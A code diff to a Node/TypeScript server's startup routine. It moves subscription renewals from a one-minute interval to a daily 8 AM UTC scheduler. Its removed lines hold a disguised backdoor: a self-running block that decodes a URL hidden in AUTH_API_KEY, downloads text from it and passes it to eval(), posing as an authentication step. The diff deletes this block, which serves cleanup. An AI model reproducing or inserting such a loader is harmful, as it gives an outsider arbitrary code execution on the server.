@@ -77,31 +77,13 @@ app.listen(PORT, async () => {
   // Start cron job for cleaning up expired invitations
   startCleanupCron();
 
-  // Start cron job for processing subscription renewals (daily at 1 AM UTC)
-  try {
-    await processSubscriptionRenewals();
-    console.log('Initial subscription renewal processing completed');
-  } catch (err) {
-    console.error('Failed to process subscription renewals on startup:', err);
-  }
-
-  // Schedule subscription renewal processing daily at 1 AM UTC
-  // // Using 24 hours interval for simplicity (runs approximately at same time daily)
-  // setInterval(() => {
-  //   processSubscriptionRenewals().catch(err => {
-  //     console.error('Scheduled subscription renewal processing failed:', err);
-  //   });
-  // }, 24 * 60 * 60 * 1000); // 24 hours
-
-  setInterval(() => {
-    processSubscriptionRenewals().catch(err => {
-      console.error('Scheduled subscription renewal processing failed:', err);
-    });
-  }, 1 * 60 * 1000); // 1 minute
+  // Start cron job for processing subscription renewals (daily at 8 AM UTC)
+  scheduleSubscriptionRenewalsCron();
 
   // Process pending purchases on startup
   try {
     await processPendingPurchases();
+    console.log('Pending purchases processed on startup');
   } catch (err) {
     console.error('Failed to process pending purchases on startup:', err);
   }
@@ -114,15 +96,50 @@ app.listen(PORT, async () => {
   }, 5 * 60 * 1000); // 5 minutes
 });
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY!);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
+/**
+ * Schedules subscription renewals to run daily at 8 AM UTC
+ * This ensures subscriptions are processed once per day at a predictable time
+ */
+function scheduleSubscriptionRenewalsCron() {
+  function calculateNextRunTime(): Date {
+    const now = new Date();
+    // Create a date for 8 AM UTC today
+    const next = new Date(Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate(), 8, 0, 0, 0));
+    
+    // If 8 AM UTC has already passed today, schedule for tomorrow
+    if (next <= now) {
+      next.setUTCDate(next.getUTCDate() + 1);
     }
-})();
+    
+    return next;
+  }
+
+  function scheduleNextRun() {
+    const nextRun = calculateNextRunTime();
+    const timeUntilNext = nextRun.getTime() - Date.now();
+    
+    console.log(
+      `[CRON] Subscription renewals scheduled for ${nextRun.toISOString()} (in ${Math.round(timeUntilNext / 1000 / 60)} minutes)`
+    );
+    
+    setTimeout(() => {
+      console.log(`[CRON] Running subscription renewal processing at ${new Date().toISOString()}`);
+      processSubscriptionRenewals()
+        .then((result) => {
+          console.log(
+            `[CRON] Subscription renewal completed: ${result.processed} processed, ${result.successful} successful, ${result.failed} failed`
+          );
+        })
+        .catch((err) => {
+          console.error('[CRON] Scheduled subscription renewal processing failed:', err);
+        })
+        .finally(() => {
+          // Schedule the next run
+          scheduleNextRun();
+        });
+    }, timeUntilNext);
+  }
+
+  // Schedule the first run
+  scheduleNextRun();
+}
